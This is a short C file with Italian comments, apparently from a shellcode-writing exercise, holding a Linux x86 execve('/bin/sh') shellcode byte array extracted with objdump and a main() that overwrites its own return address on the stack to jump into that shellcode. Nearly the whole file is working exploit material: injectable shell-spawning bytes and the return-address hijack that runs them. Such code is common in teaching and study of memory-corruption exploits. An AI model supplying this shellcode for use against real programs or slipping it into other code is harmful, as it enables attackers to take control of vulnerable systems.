/*
	Codice ottenuto dal nostro 'candy'
	Usato "objdump -d" e copiato a manina inizialmente...
	Poi ho creato il mio script
*/
char shellcode[] =
	"\xeb\x0f\x31\xc0\xb0\x0b\x5b\x31\xc9\x51\x53\x89\xe1\x31\xd2\xcd\x80\xe8"
	"\xec\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";

void main() {
	int * ret;
	ret = (int *) &ret + 2;
	(* ret) = (int) shellcode;
}